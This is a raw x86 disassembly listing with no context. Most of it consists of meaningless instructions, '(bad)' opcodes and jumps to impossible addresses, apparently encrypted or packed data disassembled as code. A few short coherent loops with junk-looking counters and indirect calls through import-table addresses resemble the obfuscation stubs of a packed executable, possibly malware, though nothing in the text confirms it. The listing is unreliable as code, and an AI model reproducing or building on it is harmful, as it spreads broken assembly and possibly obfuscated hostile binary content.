  4020e6:	fnstsw WORD PTR [edx]
  4020e8:	test   BYTE PTR ds:0x7f557e7e,al
  4020ee:	jle    0x40216e
  4020f0:	je     0x402120
  4020f2:	retf   
  4020f3:	or     ch,dh
  4020f5:	retf   
  4020f6:	adc    al,0x16
  4020f8:	mov    dh,0x80
  4020fa:	add    eax,0x911b123
  4020ff:	sub    ebx,esi
  402101:	xor    eax,DWORD PTR [ecx+0x3baa0337]
  402107:	jp     0x4020e3
  402109:	pushf  
  40210a:	and    dl,ch
  40210c:	and    dh,ch
  40210e:	aas    
  40210f:	sub    DWORD PTR [esi],0x54e1f6a5
  402115:	sbb    cl,ch
  402117:	ja     0x4020e8
  402119:	cmp    BYTE PTR [edx],dh
  40211b:	out    dx,al
  40211c:	sub    BYTE PTR [ebx*8+0x15732458],al
  402123:	or     BYTE PTR [eax],dl
  402125:	xchg   esi,eax
  402126:	lods   al,BYTE PTR ds:[esi]
  402127:	mov    edi,0x9d9a0767
  40212c:	adc    esp,eax
  40212e:	pop    ebx
  40212f:	push   DWORD PTR [esi]
  402131:	sbb    ecx,edx
  402133:	adc    BYTE PTR [ebx-0x60],cl
  402136:	push   ecx
  402137:	jb     0x402118
  402139:	inc    esi
  40213a:	xchg   esp,eax
  40213b:	mov    ?,WORD PTR ds:0xb7d89a06
  402141:	xor    al,0x83
  402143:	jge    0x402154
  402145:	pop    ds
  402146:	into   
  402147:	xlat   BYTE PTR ds:[ebx]
  402148:	std    
  402149:	imul   esi,DWORD PTR [eax*4-0x14efb74c],0xffffff9e
  402151:	dec    di
  402153:	jmp    0x2a78ef09
  402158:	xchg   esi,eax
  402159:	sahf   
  40215a:	(bad)  
  40215b:	and    eax,DWORD PTR [edx+0x52]
  40215e:	pop    edi
  40215f:	fiadd  DWORD PTR [edx+0x5312bec9]
  402165:	mov    ds:0xf60d2fb5,al
  40216a:	ret    
  40216b:	mov    DWORD PTR [eax+0x33],ecx
  40216e:	dec    ecx
  40216f:	mov    al,ds:0x5a4beca4
  402174:	out    0x6c,al
  402176:	mov    bh,0x1d
  402178:	mov    bh,0x73
  40217a:	jo     0x40213f
  40217c:	sbb    ebx,DWORD PTR [eax+0x64]
  40217f:	das    
  402180:	dec    edi
  402181:	lahf   
  402182:	test   al,0x50
  402184:	retfw  
  402186:	xchg   ecx,eax
  402187:	xor    DWORD PTR [ebx-0x11],esp
  40218a:	inc    edx
  40218b:	shr    DWORD PTR [edx],0x67
  40218e:	das    
  40218f:	mov    dh,0x9c
  402191:	aad    0x65
  402193:	mov    bh,0x42
  402195:	mov    bh,0xfd
  402197:	ins    DWORD PTR es:[edi],dx
  402198:	dec    edi
  402199:	shufps xmm4,XMMWORD PTR [ebp+esi*1-0x4c0a0620],0xf0
  4021a2:	inc    esi
  4021a3:	fidivr WORD PTR [ecx+0x254e6e03]
  4021a9:	mov    ds:0x2d5d63d3,eax
  4021ae:	repz pop edx
  4021b0:	fucom  st(2)
  4021b2:	mov    esp,0x6c07b2e4
  4021b7:	push   esi
  4021b8:	sub    eax,0x1e3b3a08
  4021bd:	sub    DWORD PTR [ecx-0x79f95e2e],esi
  4021c3:	xor    eax,0x4a3087f4
  4021c8:	pop    ecx
  4021c9:	addr16 jae 0x4021c3
  4021cc:	and    esp,DWORD PTR [ecx]
  4021ce:	push   0xfffffff1
  4021d0:	jo     0x4021b2
  4021d2:	mov    edx,0x2fcbe85a
  4021d7:	loope  0x402190
  4021d9:	jmp    0x10210fac
  4021de:	stos   DWORD PTR es:[edi],eax
  4021df:	mov    ds:0xe34b4d81,eax
  4021e4:	push   esp
  4021e5:	pop    eax
  4021e6:	stc    
  4021e7:	inc    ecx
  4021e8:	leave  
  4021e9:	lahf   
  4021ea:	mov    edx,0x2dbc0151
  4021ef:	imul   eax,eax,0x1485ac20
  4021f5:	or     ebp,DWORD PTR [eax+0xd633c5f]
  4021fb:	sbb    DWORD PTR [eax+0x42],eax
  4021fe:	(bad)  
  402200:	mov    ds:0x7145094c,eax
  402205:	loopne 0x402262
  402207:	sub    DWORD PTR [ecx+0x19],esi
  40220a:	mov    ebp,fs
  40220c:	xchg   ebx,eax
  40220d:	sbb    DWORD PTR [edx+0x328ac3f3],edx
  402213:	les    esp,FWORD PTR [ecx+0x5c]
  402216:	outs   dx,BYTE PTR ds:[esi]
  402217:	stos   BYTE PTR es:[edi],al
  402218:	scas   al,BYTE PTR es:[edi]
  402219:	retf   0x472c
  40221c:	out    0x3a,eax
  40221e:	cmp    al,0xed
  402221:	nop
  402222:	pop    ecx
  402223:	cmp    DWORD PTR [edx-0x7852aa8b],ebx
  402229:	mov    dh,0x97
  40222b:	fst    DWORD PTR [ebp+0x34bcb42d]
  402231:	push   esi
  402232:	and    al,0xe6
  402234:	cmp    BYTE PTR [eax],dl
  402236:	out    0xa5,al
  402238:	mov    esp,0xa61105d3
  40223d:	xor    al,0x63
  40223f:	leave  
  402240:	aaa    
  402241:	xchg   esp,eax
  402242:	cmp    DWORD PTR [ebx],eax
  402244:	clc    
  402245:	ins    DWORD PTR es:[edi],dx
  402246:	cmp    eax,0xf5a0d0b9
  40224b:	or     al,0x25
  40224d:	adc    eax,0x5cac5be1
  402252:	ins    BYTE PTR es:[edi],dx
  402253:	out    dx,eax
  402254:	cmp    bl,BYTE PTR [edx+0x76]
  402257:	jo     0x402239
  402259:	ss fmulp st(3),st
  40225c:	lahf   
  40225d:	push   edx
  40225e:	pop    es
  40225f:	imul   ebx,DWORD PTR [ebp-0x7a],0xc2262b69
  402266:	fild   DWORD PTR [ebx+ebx*2+0x53]
  40226a:	mov    dh,0x5
  40226c:	icebp  
  40226d:	add    ebx,DWORD PTR [ecx]
  40226f:	or     DWORD PTR [ecx],0x3131e715
  402275:	mov    dl,0x6d
  402277:	dec    ebp
  402278:	pcmpeqd mm7,mm7
  40227b:	mov    eax,0xea345002
  402280:	repz add eax,0xd0627e6d
  402286:	(bad)  
  402287:	push   esi
  402288:	jns    0x4022df
  40228a:	aaa    
  40228b:	push   es
  40228c:	repnz retf 0x4665
  402290:	jbe    0x402236
  402292:	and    al,0xed
  402294:	adc    DWORD PTR [esi+0x5ad79742],esp
  40229a:	scas   al,BYTE PTR es:[edi]
  40229b:	dec    ebp
  40229c:	stc    
  40229d:	sbb    dh,ch
  40229f:	jecxz  0x4022e0
  4022a1:	sub    BYTE PTR [eax+0x7156119e],bh
  4022a7:	rcl    DWORD PTR [esi],1
  4022a9:	push   esp
  4022aa:	popf   
  4022ab:	or     al,0x5d
  4022ad:	jg     0x402255
  4022af:	retf   
  4022b0:	cmp    eax,0x905675fa
  4022b5:	div    dl
  4022b7:	adc    DWORD PTR [eax-0x608d7eac],eax
  4022bd:	jnp    0x402336
  4022bf:	sbb    DWORD PTR cs:[edx-0x5c],esp
  4022c3:	push   edi
  4022c4:	pop    ds
  4022c5:	js     0x4022db
  4022c7:	jo     0x40225e
  4022c9:	rcl    ebp,0x51
  4022cc:	and    DWORD PTR ds:0x42ec6f,0x0
  4022d6:	mov    edx,DWORD PTR ds:0x42ec6f
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42ec6f,edx
  4022e3:	cmp    DWORD PTR ds:0x42ec6f,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e83f
  4022fe:	cmp    DWORD PTR ds:0x42ec6f,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x4302c1,0x1f
  402315:	cmp    DWORD PTR ds:0x4302c1,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x4302c1,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e82f
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x4302c1
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x4302c1,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	cmc    
  402362:	or     edx,DWORD PTR [ebx-0x1e]
  402365:	fild   DWORD PTR [ebx]
  402367:	jle    0x4023e7
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x4023a5
  40236e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40236f:	pop    ebx
  402370:	sbb    ecx,DWORD PTR ds:[esi-0x25]
  402374:	pusha  
  402375:	(bad)
  402379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40237a:	das    
  40237b:	loop   0x402329
  40237d:	pop    esi
  40237e:	sub    ebx,esp
  402380:	pop    es
  402381:	pushf  
  402382:	mov    cl,0x3e
  402384:	xor    BYTE PTR [esi+0x73],cl
  402387:	and    dh,BYTE PTR ds:[esi+0x25]
  40238b:	inc    edx
  40238c:	sub    bh,BYTE PTR [edi-0x5878010b]
  402392:	(bad)  
  402393:	sbb    bh,BYTE PTR [ecx]
  402395:	mov    esp,0x4291d2d9
  40239a:	int3   
  40239b:	push   ebp
  40239c:	inc    edx
  40239d:	dec    ebp
  40239e:	(bad)  
  40239f:	pop    esi
  4023a0:	jnp    0x40241d
  4023a2:	mov    edi,0xb26f1bc8
  4023a7:	test   DWORD PTR [edx-0x680438bf],0x7dc6583c
  4023b1:	pop    edx
  4023b2:	sub    BYTE PTR [ebx-0x7225940f],0x95
  4023b9:	mov    ch,0x26
  4023bb:	ss nop
  4023bd:	sub    ah,BYTE PTR [esi+0x4e]
  4023c0:	cmp    ebx,0xffffffb1
  4023c3:	adc    DWORD PTR [eax+0x3f],ecx
  4023c6:	or     eax,0x30ef4303
  4023cb:	int    0x7b
  4023cd:	retf   0x9b76
  4023d0:	aad    0xf4
  4023d2:	lods   eax,DWORD PTR ds:[esi]
  4023d3:	jle    0x4023ba
  4023d5:	retf   
  4023d6:	adc    al,0x55
  4023d8:	lds    ebp,FWORD PTR [edi+ecx*1+0x63ac424d]
  4023df:	xchg   esp,ebx
  4023e1:	bound  esi,QWORD PTR [ebp+0x13]
  4023e4:	pop    es
  4023e5:	pop    es
  4023e6:	jge    0x4023df
  4023e8:	cs popf 
  4023ea:	lss    eax,FWORD PTR [edi+eiz*1+0x69]
  4023ef:	jo     0x4023c6
  4023f1:	jl     0x402391
  4023f3:	int    0x61
  4023f5:	pusha  
  4023f6:	push   ebp
  4023f7:	retf   0x4496
  4023fa:	fsub   QWORD PTR [edx+0x2fde57af]
  402400:	cdq    
  402401:	cmc    
  402402:	adc    eax,0x8ddf7d01
  402407:	push   ss
  402408:	mov    ebp,0x5820b8e3
  40240d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40240f:	call   0x5711:0x7b170615
  402416:	fs nop
  402418:	adc    esi,esi
  40241a:	jp     0x40241f
  40241c:	fs push ds
  40241e:	push   esp
  40241f:	fs push ebp
  402421:	ins    BYTE PTR es:[edi],dx
  402422:	dec    edx
  402423:	cmp    dl,BYTE PTR [esi-0x4b26e494]
  402429:	idiv   DWORD PTR [edx-0x8]
  40242c:	push   ss
  40242d:	mov    dh,BYTE PTR [esp+ebx*4]
  402430:	outs   dx,DWORD PTR ds:[esi]
  402431:	imul   ebx,DWORD PTR [edx+0x1f],0x764283c7
  402438:	mov    edx,0x13002754
  40243d:	sbb    eax,0x6d60441e
  402442:	daa    
  402443:	loop   0x402466
  402445:	jmp    0x40243f
  402447:	mov    edi,0x8a61fb34
  40244c:	inc    ebx
  40244d:	mov    bl,0x21
  40244f:	in     al,dx
  402450:	inc    eax
  402451:	push   ebx
  402452:	dec    esp
  402453:	les    esp,FWORD PTR [ebx-0x77]
  402456:	mov    ecx,0xf364a614
  40245b:	and    eax,DWORD PTR [edi+0x2]
  40245e:	mov    ds:0x38a4e406,eax
  402463:	out    dx,eax
  402464:	fwait
  402465:	xor    dh,BYTE PTR fs:[esi]
  402468:	outs   dx,BYTE PTR ds:[esi]
  402469:	xlat   BYTE PTR ds:[ebx]
  40246a:	popa   
  40246b:	cmc    
  40246c:	sbb    ch,BYTE PTR [edx]
  40246e:	jnp    0x4024d8
  402470:	mov    DWORD PTR [edx-0x57],0x7bda06d9
  402477:	add    BYTE PTR [edx-0x1c962acb],dl
  40247d:	lods   al,BYTE PTR ds:[esi]
  40247e:	(bad)  
  40247f:	in     eax,0x56
  402481:	xlat   BYTE PTR ds:[ebx]
  402482:	mov    dl,0xdf
  402484:	mov    ecx,0xe2a79240
  402489:	div    ecx
  40248b:	adc    al,0xb0
  40248d:	dec    dh
  40248f:	popa   
  402490:	inc    ebx
  402491:	jns    0x402437
  402493:	sbb    edx,DWORD PTR [edx]
  402495:	cmp    esp,0xffffff8c
  402498:	inc    esp
  402499:	in     al,0x88
  40249b:	sbb    ebp,DWORD PTR [ebp+0x5b833438]
  4024a1:	pusha  
  4024a2:	(bad)  
  4024a3:	mov    ds:0xdadff33f,eax
  4024a8:	pop    ds
  4024a9:	sbb    bl,BYTE PTR [eax]
  4024ab:	push   esi
  4024ac:	je     0x4024af
  4024ae:	cwde   
  4024af:	inc    ebp
  4024b0:	or     eax,edi
  4024b2:	or     BYTE PTR [edi-0x4f181b24],ch
  4024b8:	mov    bl,dh
  4024ba:	cmp    DWORD PTR [ecx+0x27],ebx
  4024bd:	dec    esp
  4024be:	cli    
  4024bf:	mov    ch,BYTE PTR [edi]
  4024c1:	and    BYTE PTR [ecx+ebx*1-0x26d506e3],al
  4024c8:	xchg   esi,eax
  4024c9:	out    dx,eax
  4024ca:	cwde   
  4024cb:	sub    eax,0xebbaf8da
  4024d0:	mov    edi,0x671b98
  4024d5:	xor    esi,esp
  4024d7:	mov    ebp,0xb6a0a489
  4024dc:	xchg   esp,eax
  4024dd:	and    al,0x57
  4024df:	push   esp
  4024e0:	sbb    esi,DWORD PTR [edi]
  4024e2:	and    al,0x31
  4024e4:	pop    ecx
  4024e5:	stos   DWORD PTR es:[edi],eax
  4024e6:	xor    al,0xe6
  4024e8:	push   0x35fa6876
  4024ed:	or     eax,DWORD PTR es:0xb175d96a
  4024f4:	jbe    0x402522
  4024f6:	fwait
  4024f7:	les    esp,FWORD PTR [ebp+0x64]
  4024fa:	loope  0x40256c
  4024fc:	scas   al,BYTE PTR es:[edi]
  4024fd:	pop    esp
  4024fe:	ja     0x40250d
  402500:	add    esi,DWORD PTR [edi+0x728d26d5]
  402506:	fcomp  QWORD PTR [edi-0x6d]
  402509:	and    ebp,DWORD PTR [edx]
  40250b:	or     DWORD PTR [ecx],0xffffffd9
  40250e:	xchg   ecx,eax
  40250f:	jl     0x402549
  402511:	test   eax,0xbe4d47f4
  402516:	rcl    BYTE PTR [ecx-0x69341b0d],cl
  40251c:	jg     0x40258d
  40251e:	pop    ebx
  40251f:	adc    eax,0xc73361d0
  402524:	lock ins BYTE PTR es:[edi],dx
  402526:	add    BYTE PTR ds:0x882f7b00,dl
  40252c:	jg     0x4024d3
  40252e:	retf   0x55a1
  402531:	push   0xc717c551
  402536:	or     eax,0x29da0783
  40253b:	jg     0x402541
  40253d:	rol    BYTE PTR [edi],0xec
  402540:	pop    ebp
  402541:	adc    al,0x4f
  402543:	jp     0x40256c
  402545:	in     eax,dx
  402546:	call   0x25c176c9
  40254b:	dec    ebx
  40254c:	in     al,dx
  40254d:	inc    edx
  40254e:	add    BYTE PTR [ecx],bh
  402550:	xor    eax,DWORD PTR [eax]
  402552:	add    BYTE PTR [eax-0x7637acf],bh
  402558:	movzx  edx,WORD PTR ds:0x42ec73
  40255f:	xor    edx,DWORD PTR ds:0x42ec4f
  402565:	mov    DWORD PTR ds:0x42ec73,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x4302e5,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x4302c5
  402592:	and    DWORD PTR ds:0x42ec57,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x43034f,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x43034f
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x43034f,esi
  4025b8:	cmp    DWORD PTR ds:0x43034f,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x43034f,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e6c6
  4025d7:	call   DWORD PTR ds:0x42e843
  4025dd:	cmp    DWORD PTR ds:0x43034f,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x43034f
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x43034f,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs pushf 
  402613:	mov    cl,BYTE PTR [esi+0x7e013e77]
  402619:	jle    0x402670
  40261b:	jg     0x40269b
  40261d:	jle    0x4025f5
  40261f:	clc    
  402620:	jg     0x40266c
  402622:	add    cl,cl
  402624:	dec    esi
  402625:	popa   
  402626:	in     al,dx
  402627:	mov    ?,WORD PTR [ecx-0x638f723f]
  40262d:	(bad)  
  40262f:	nop
  402630:	and    BYTE PTR [ebx],ch
  402632:	and    cl,BYTE PTR fs:[eax-0x47]
  402636:	(bad)  
  402637:	in     eax,0xb4
  402639:	idiv   DWORD PTR [ecx+0x5b]
  40263c:	inc    ecx
  40263d:	mov    edx,ecx
  40263f:	and    edi,DWORD PTR [edx]
  402641:	fidiv  DWORD PTR [esi+0x4ba810cf]
  402647:	dec    esi
  402648:	cld    
  402649:	pushf  
  40264a:	mov    dl,ah
  40264c:	xlat   BYTE PTR ds:[ebx]
  40264d:	sub    DWORD PTR [esi+edi*4-0x69],esi
  402651:	xchg   edi,eax
  402652:	xchg   esi,eax
  402653:	sub    dl,BYTE PTR [esi]
  402655:	add    eax,0x20e9f880
  40265a:	push   DWORD PTR [ebp-0x3f56937e]
  402660:	aas    
  402661:	mov    bh,0x2
  402663:	test   eax,0x26d7963f
  402668:	out    0x2a,al
  40266a:	mov    eax,ds:0x64587b77
  40266f:	stos   BYTE PTR es:[edi],al
  402670:	dec    esp
  402671:	pop    eax
  402672:	mov    bh,0x4e
  402674:	enter  0x5565,0x3f
  402678:	not    DWORD PTR [eax+0x58a97284]
  40267e:	or     BYTE PTR [edx],dl
  402680:	fadd   DWORD PTR [ecx]
  402682:	ins    BYTE PTR es:[edi],dx
  402683:	and    al,0xec
  402685:	dec    edx
  402686:	push   edi
  402687:	sub    DWORD PTR [edi-0x4b4d6025],edx
  40268d:	mov    bl,0x8b
  40268f:	push   ecx
  402690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402691:	jp     0x40267e
  402693:	ror    DWORD PTR [esi],0xcc
  402696:	daa    
  402697:	or     DWORD PTR [edi],0xdb8f8e84
  40269d:	and    dh,BYTE PTR [ebx-0x2d2f7bce]
  4026a3:	arpl   WORD PTR [ebx+ebx*1-0x71],si
  4026a7:	xchg   ecx,eax
  4026a8:	arpl   WORD PTR [esi-0x3709dee9],ax
  4026ae:	push   esi
  4026af:	daa    
  4026b0:	inc    esp
  4026b1:	in     al,dx
  4026b2:	inc    esi
  4026b3:	mov    ebx,0x7438d9ac
  4026b8:	add    ecx,DWORD PTR [ecx+edi*8+0x14242779]
  4026bf:	(bad)  
  4026c0:	sbb    al,0xad
  4026c2:	xchg   ecx,eax
  4026c3:	pop    ss
  4026c4:	push   edi
  4026c5:	cmp    eax,0x878674a9
  4026ca:	pop    ebp
  4026cb:	push   0xb283fb0e
  4026d0:	and    eax,0x58812b11
  4026d5:	imul   ebp,edx,0x413529ac
  4026db:	or     ecx,DWORD PTR ds:0x311d1058
  4026e1:	jle    0x4026e6
  4026e3:	(bad)  
  4026e4:	out    0xeb,eax
  4026e6:	mov    ecx,0x643bace
  4026eb:	sbb    eax,0x28cb739b
  4026f0:	aad    0x34
  4026f2:	push   esi
  4026f3:	xchg   BYTE PTR [ecx-0x1427b6cb],cl
  4026f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026fa:	jmp    0xf03136f7
  4026ff:	cld    
  402700:	neg    DWORD PTR [ecx]
  402702:	push   es
  402703:	(bad)  
  402704:	shl    DWORD PTR [ebp+0x2f],1
  402707:	ror    ebp,1
  402709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40270a:	arpl   WORD PTR [edx+eiz*2],sp
  40270d:	(bad)  
  40270e:	or     al,0x44
  402710:	hlt    
  402711:	cmp    DWORD PTR [ecx+eiz*4],0xfffffffc
  402715:	xor    dh,BYTE PTR [edx+0x6195cec3]
  40271b:	imul   eax,DWORD PTR [edx+0x6],0xffffff83
  40271f:	ins    DWORD PTR es:[edi],dx
  402720:	jns    0x40276d
  402722:	je     0x4026f9
  402724:	inc    eax
  402725:	jmp    0x402786
  402727:	dec    ebp
  402728:	dec    edx
  402729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40272a:	in     al,dx
  40272b:	loopne 0x402721
  40272d:	loop   0x402767
  40272f:	lahf   
  402730:	out    dx,al
  402731:	cmp    al,bh
  402733:	cmc    
  402734:	jle    0x4026b6
  402736:	out    0x55,eax
  402738:	sub    BYTE PTR [ecx-0x12edd502],dl
  40273e:	lods   al,BYTE PTR ds:[esi]
  40273f:	loopne 0x40273e
  402741:	popf   
  402742:	pop    edi
  402743:	call   0xc3c12c46
  402748:	jns    0x402718
  40274a:	outs   dx,DWORD PTR ds:[esi]
  40274b:	mov    ebx,0xb575a472
  402750:	test   ecx,esi
  402752:	in     eax,0x6a
  402754:	mov    ecx,0x586d477e
  402759:	pop    ds
  40275a:	daa    
  40275b:	call   0x3edb9be7
  402760:	push   ds
  402761:	mul    BYTE PTR [ebp+0x21b55e3b]
  402767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402768:	push   edx
  402769:	enter  0xdd1,0x9d
  40276d:	gs cmc 
  40276f:	push   ebp
  402770:	ds iret 
  402772:	push   eax
  402773:	retf   
  402774:	mov    ebx,0x2a013a84
  402779:	out    dx,al
  40277a:	pop    ebp
  40277b:	jecxz  0x4027a9
  40277d:	loope  0x402732
  40277f:	inc    edi
  402780:	add    BYTE PTR [ebx-0x13],ah
  402783:	pushf  
  402784:	add    al,0x82
  402786:	sub    dh,BYTE PTR [edx]
  402788:	jbe    0x4027cf
  40278a:	dec    ecx
  40278b:	fs into 
  40278d:	sub    al,0xf1
  40278f:	mov    DWORD PTR [ebx],edx
  402791:	mov    ebp,0xfc2fe172
  402796:	xor    eax,esp
  402798:	popa   
  402799:	call   0xe135:0xec077233
  4027a0:	and    bl,dl
  4027a2:	mov    ebp,0xb0091c43
  4027a7:	xchg   DWORD PTR [edi-0x26],esi
  4027aa:	scas   eax,DWORD PTR es:[edi]
  4027ab:	jo     0x402784
  4027ad:	mov    DWORD PTR [edi+ebp*2+0x49],edx
  4027b1:	(bad)  
  4027b2:	fsub   QWORD PTR [ebp+0x39ee1d2b]
  4027b8:	icebp  
  4027b9:	xchg   esi,eax
  4027ba:	mov    eax,gs
  4027bc:	jge    0x402754
  4027be:	(bad)  
  4027bf:	fstp   QWORD PTR [ebx]
  4027c1:	ins    BYTE PTR es:[edi],dx
  4027c2:	dec    esp
  4027c3:	push   0xffffffef
  4027c5:	mov    dh,al
  4027c7:	xor    al,0xea
  4027c9:	jne    0x40283d
  4027cb:	mov    eax,0xd92c9a4c
  4027d0:	or     eax,0x70b4b12f
  4027d5:	push   ds
  4027d6:	cmp    dl,ch
  4027d8:	repnz popa 
  4027da:	pop    edi
  4027db:	mov    eax,ds:0x68ccf26d
  4027e0:	js     0x4027a6
  4027e2:	jg     0x402790
  4027e4:	pop    ebp
  4027e5:	(bad)  
  4027e6:	sahf   
  4027e7:	aam    0xfb
  4027e9:	cmp    eax,0x1a3ad7b3
  4027ee:	jo     0x4027d5
  4027f0:	(bad)  
  4027f1:	not    BYTE PTR [edx]
  4027f3:	xor    dh,BYTE PTR ds:0x1825dab4
  4027f9:	push   edi
  4027fa:	mov    edi,DWORD PTR [ebp+0x10]
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    edx,ebx
  402828:	adc    al,0x3d
  40282a:	inc    esi
  40282b:	adc    eax,0x557e7e0f
  402830:	jg     0x4028b0
  402832:	jle    0x402821
  402834:	call   DWORD PTR [ebx+esi*2+0x34]
  402838:	(bad)  
  402839:	(bad)  
  40283a:	je     0x40287f
  40283c:	cmp    edi,esp
  40283e:	and    bl,cl
  402840:	jne    0x40280f
  402842:	jle    0x40287e
  402844:	nop
  402845:	loope  0x402857
  402847:	jbe    0x40280c
  402849:	inc    esp
  40284a:	lods   al,BYTE PTR ds:[esi]
  40284b:	dec    esi
  40284c:	ficom  DWORD PTR [ebx-0x11]
  40284f:	scas   al,BYTE PTR es:[edi]
  402850:	push   0x2e
  402852:	fimul  DWORD PTR [ebx+0xe]
  402855:	push   ebp
  402856:	sti    
  402857:	in     eax,0xa6
  402859:	(bad)  
  40285a:	out    0xe8,al
  40285c:	into   
  40285d:	mov    ah,0x7e
  40285f:	daa    
  402860:	pusha  
  402861:	lods   eax,DWORD PTR ds:[esi]
  402862:	xchg   esp,eax
  402863:	lea    eax,[edx+0x4]
  402866:	ret    0x59c9
  402869:	adc    BYTE PTR [edi+0x3],ch
  40286c:	push   ss
  40286d:	(bad)  
  40286e:	int    0x62
  402870:	inc    ebp
  402871:	jo     0x40288b
  402873:	xchg   ebx,eax
  402874:	ret    
  402875:	jns    0xa10fddbf
  40287b:	mov    dl,0xd2
  40287d:	mov    ecx,DWORD PTR [ebp+esi*4+0x66]
  402881:	or     BYTE PTR [ebx+0x22],cl
  402884:	cld    
  402885:	cmp    al,0x62
  402887:	les    esp,FWORD PTR [ebp+0x5e8cb819]
  40288d:	cmp    DWORD PTR [edi-0x51],edi
  402890:	push   edi
  402891:	push   esi
  402892:	pop    ebp
  402893:	push   edi
  402894:	mov    ebx,0x3a75596
  402899:	adc    al,BYTE PTR [esi-0x22]
  40289c:	outs   dx,DWORD PTR ds:[esi]
  40289d:	in     eax,0x56
  40289f:	inc    esi
  4028a0:	int    0xe2
  4028a2:	push   ebx
  4028a3:	clc    
  4028a4:	pop    edi
  4028a5:	out    dx,eax
  4028a6:	ins    BYTE PTR es:[edi],dx
  4028a7:	add    BYTE PTR [edx],0xb4
  4028aa:	mov    cl,0xa2
  4028ac:	xor    eax,0x41243888
  4028b1:	aad    0xcc
  4028b3:	loop   0x402916
  4028b5:	test   al,0xf9
  4028b7:	push   ecx
  4028b8:	mov    eax,DWORD PTR [ebx+0x32a712ed]
  4028be:	(bad)  
  4028bf:	in     eax,dx
  4028c0:	das    
  4028c1:	ins    BYTE PTR es:[edi],dx
  4028c2:	lods   eax,DWORD PTR ds:[esi]
  4028c3:	adc    al,0x8d
  4028c5:	cs sahf 
  4028c7:	add    ebp,esp
  4028c9:	mov    bh,0xcc
  4028cb:	push   ecx
  4028cc:	and    DWORD PTR [edi-0x1f1e3e0c],eax
  4028d2:	psrlw  mm2,mm3
  4028d5:	(bad)  
  4028d6:	jbe    0x4028aa
  4028d8:	(bad)  
  4028d9:	sbb    al,0xc9
  4028db:	mov    WORD PTR [edx-0x45],cs
  4028de:	dec    ebx
  4028df:	lds    ebp,FWORD PTR [edi-0x270c41a1]
  4028e5:	es inc ecx
  4028e7:	cli    
  4028e8:	outs   dx,DWORD PTR ds:[esi]
  4028e9:	outs   dx,DWORD PTR ds:[esi]
  4028ea:	dec    edx
  4028eb:	sub    DWORD PTR [edi],0xc
  4028ee:	aas    
  4028ef:	dec    ecx
  4028f0:	inc    ecx
  4028f1:	fistp  QWORD PTR [esi]
  4028f3:	xor    al,0xda
  4028f5:	adc    BYTE PTR [eax],bh
  4028f7:	or     ah,BYTE PTR [edi]
  4028f9:	sub    al,0x28
  4028fb:	repz mov bl,0xa7
  4028fe:	shr    DWORD PTR [ecx+ecx*1-0x34],1
  402902:	popa   
  402903:	xor    DWORD PTR [ebp-0x4fcf6799],ebx
  402909:	(bad)  
  40290a:	out    0xc,al
  40290c:	into   
  40290d:	cmp    DWORD PTR [esi-0x41],0x498582cd
  402914:	cmc    
  402915:	mov    ebp,0xd3b2f6fa
  40291a:	inc    edx
  40291b:	outs   dx,BYTE PTR ds:[esi]
  40291c:	push   ds
  40291d:	cmp    DWORD PTR [edx+0x59],edi
  402920:	ins    DWORD PTR es:[edi],dx
  402921:	pop    esi
  402922:	mov    gs,WORD PTR [esi+0x71821d5e]
  402928:	loope  0x40290b
  40292a:	inc    edx
  40292b:	hlt    
  40292c:	adc    DWORD PTR [esi+0x319634e5],ebp
  402932:	xchg   esp,eax
